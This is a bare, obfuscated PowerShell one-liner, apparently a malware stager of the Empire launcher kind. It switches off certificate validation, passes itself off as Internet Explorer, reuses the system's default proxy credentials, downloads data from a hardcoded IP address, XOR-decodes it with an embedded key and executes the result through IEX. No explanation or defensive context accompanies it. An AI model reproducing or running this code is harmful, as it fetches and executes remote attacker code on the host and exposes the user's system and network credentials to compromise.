
$wc=NEw-Object SYSteM.NEt.WeBClIENt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true};$WC.HEaders.AdD('User-Agent',$u);$Wc.PROXY = [SYsTem.Net.WEbREQUEsT]::DefAulTWebPrOXy;$Wc.Proxy.CREdenTiAls = [SYSTeM.NEt.CreDentIAlCAcHe]::DeFauLTNEtworKCrEdENTiaLs;$K='tJ2esVpq;/yZ7CmW&3P,HiOU?l<~b6If';$i=0;[chAr[]]$b=([chAr[]]($Wc.DOwNlOaDStriNG("https://46.101.203.156:443/index.asp")))|%{$_-BXoR$k[$I++%$k.LENgth]};IEX ($B-JOIn'')

